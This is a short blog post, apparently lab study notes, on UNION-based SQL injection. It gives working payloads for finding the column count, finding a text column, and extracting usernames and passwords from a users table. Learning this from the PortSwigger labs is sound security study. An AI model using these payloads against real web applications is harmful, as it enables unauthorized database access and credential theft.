---
layout: post
title: "SQL Injection: UNION-based Data Extraction"
date: 2026-07-05
category: "Web Exploitation"
tags: [sqli, databases, union]
excerpt: "Using UNION SELECT to pull data out of other tables once you know the column count and a text-compatible column."
---

Notes on the classic UNION-based SQLi workflow from the PortSwigger labs.

## Step 1: Find the column count

`ORDER BY` climbing until it errors, or incrementing `NULL`s:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--   -- no error = 3 columns
```

## Step 2: Find a column that holds text

Replace each `NULL` with a string until the value renders on the page:

```sql
' UNION SELECT 'a',NULL,NULL--
```

## Step 3: Extract the data

Once you have a text-compatible column, pull real data:

```sql
' UNION SELECT username, password, NULL FROM users--
```

| Concept | Why it matters |
|---------|----------------|
| Column count | UNION requires matching column numbers |
| Data type | The injected column must accept strings |
| DB fingerprint | `version()`, `@@version` etc. differ per engine |

## Takeaway

> UNION attacks are about *shape*: match the column count and a compatible type,
> then the rest of the database is one query away.
